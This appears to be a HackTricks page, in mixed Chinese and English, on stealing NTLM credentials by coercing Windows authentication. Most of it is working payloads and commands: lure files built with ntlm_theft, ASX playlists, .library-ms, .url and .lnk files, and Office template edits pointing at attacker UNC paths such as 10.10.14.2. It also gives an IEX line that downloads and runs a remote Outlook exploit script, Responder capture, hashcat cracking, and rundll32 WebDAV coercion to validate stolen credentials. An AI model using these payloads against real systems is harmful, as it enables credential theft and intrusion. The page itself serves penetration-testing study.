# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**查看来自 [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) 的所有好点子，从在线下载的 Microsoft Word 文件到 ntlm leak 源头：https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 以及 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

如果你可以**写入一个用户或计划任务会在 Explorer 中浏览的 share**，就放入其 metadata 指向你的 UNC 的文件（例如 `\\ATTACKER\share`）。渲染该文件夹会触发**隐式 SMB authentication**，并把一个 **NetNTLMv2** 泄露给你的 listener。

1. **Generate lures**（覆盖 SCF/URL/LNK/library-ms/desktop.ini/Office/RTF 等）
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **将它们放到可写共享上**（受害者会打开的任意文件夹）：
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows 可能会一次命中多个文件；任何 Explorer 预览（`BROWSE TO FOLDER`）都不需要点击。

### Windows Media Player playlists (.ASX/.WAX)

如果你能让目标打开或预览你控制的 Windows Media Player playlist，你可以通过将条目指向一个 UNC path 来泄露 Net‑NTLMv2。WMP 会尝试通过 SMB 获取引用的 media，并会自动进行认证。

示例 payload：
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
收集和破解流程：
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer insecurely handles .library-ms files when they are opened directly from within a ZIP archive. If the library definition points to a remote UNC path (e.g., \\attacker\share), simply browsing/launching the .library-ms inside the ZIP causes Explorer to enumerate the UNC and emit NTLM authentication to the attacker. This yields a NetNTLMv2 that can be cracked offline or potentially relayed.

指向 attacker UNC 的最小 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
操作步骤
- 使用上面的 XML 创建 .library-ms 文件（设置你的 IP/hostname）。
- 将其压缩（在 Windows 上：Send to → Compressed (zipped) folder）并把 ZIP 传给目标。
- 运行 NTLM capture listener，等待受害者从 ZIP 内部打开 .library-ms。


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows 处理 calendar items 中的扩展 MAPI 属性 PidLidReminderFileParameter。 如果该属性指向一个 UNC path（例如，\\attacker\share\alert.wav），Outlook 会在 reminder 触发时连接到 SMB share，从而在没有任何 click 的情况下泄露用户的 Net‑NTLMv2。这个问题已在 2023 年 3 月 14 日修补，但对于 legacy/untouched fleets 以及历史 incident response 仍然非常相关。

使用 PowerShell 的快速 exploitation（Outlook COM）：
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener 端：
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- 受害者只需要在提醒触发时运行 Outlook for Windows。
- 该 leak 产生的 Net‑NTLMv2 可用于离线破解或 relay（不是 pass‑the‑hash）。


### .LNK/.URL 基于 icon 的 zero-click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Windows Explorer 会自动渲染 shortcut icons。近期研究表明，即使在 Microsoft 2025 年 4 月针对 UNC-icon shortcuts 的补丁之后，仍然可以通过将 shortcut target 托管在 UNC path 上并保持 icon 本地，从而在无需点击的情况下触发 NTLM authentication（该 patch bypass 被分配为 CVE-2025-50154）。仅仅查看该文件夹就会导致 Explorer 从远程 target 获取 metadata，并向攻击者的 SMB server 发出 NTLM。

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- 将 shortcut 放进 ZIP 里，诱导受害者浏览它。
- 把 shortcut 放到受害者会打开的可写 share 上。
- 与同一文件夹中的其他 lure files 结合，让 Explorer 预览这些项目。

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows 在 **view/preview**（icon rendering）期间加载 `.lnk` metadata，而不只是执行时。CVE‑2026‑25185 展示了一条 parsing path，其中 **ExtraData** blocks 会让 shell resolve 一个 icon path，并在 **load** 期间触碰 filesystem，从而在路径为 remote 时发出 outbound NTLM。

关键 trigger conditions（在 `CShellLink::_LoadFromStream` 中观察到）：
- 在 ExtraData 中包含 **DARWIN_PROPS** (`0xa0000006`)（进入 icon update routine 的 gate）。
- 包含 **ICON_ENVIRONMENT_PROPS** (`0xa0000007`)，并填充 **TargetUnicode**。
- loader 会展开 `TargetUnicode` 中的 environment variables，并对结果路径调用 `PathFileExistsW`。

如果 `TargetUnicode` 解析为 UNC path（例如 `\\attacker\share\icon.ico`），那么**仅仅查看**包含该 shortcut 的文件夹就会触发 outbound authentication。相同的 load path 也可能被 **indexing** 和 **AV scanning** 命中，使其成为一个实用的 no-click leak surface。

研究工具（parser/generator/UI）可在 **LnkMeMaybe** project 中获取，用于构建/检查这些结构，而无需使用 Windows GUI。


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

原生 **WebDAV client** 可被滥用，强制当前 logon session 对任意 **HTTP/WebDAV** endpoint 进行 authentication：
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
为什么这很有用：
- 对于**攻击者控制的 WebDAV server**，它可以触发**NTLM over HTTP**，而无需投放自定义 client。
- 对于**internal hosts**，它是一种安静的方式，在进行 lateral movement 之前**验证 stolen credentials 在哪里被接受**。
- 当 **SMB egress** 被过滤但 **HTTP/WebDAV** 仍可访问时，这个 command 是一个很好的 alternative。

Operational notes:
- 源主机上必须运行 **WebClient** service。
- `rundll32.exe` 会加载 `davclnt.dll`，并让 Windows 使用**当前用户的 credentials** 处理 WebDAV authentication。
- 如果你把它指向你控制的 infrastructure，请使用支持 NTLM 的 HTTP listener/relay，例如：
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
从检测角度看，针对许多内部系统反复执行 `rundll32.exe davclnt.dll,DavSetCookie`，这是 **credential validation / spray-like lateral movement prep** 的强信号，而不是正常用户行为。

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 文档可以引用一个外部模板。如果你将附加模板设置为一个 UNC 路径，打开文档时就会对 SMB 进行身份验证。

最小 DOCX relationship 更改（在 word/ 内）：

1) 编辑 word/settings.xml 并添加附加模板引用：
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) 编辑 word/_rels/settings.xml.rels，并将 rId1337 指向你的 UNC：
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) 重新打包为 .docx 并交付。运行你的 SMB capture listener 并等待 open。

有关转发或 abusing NTLM 的后续思路，请查看：

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
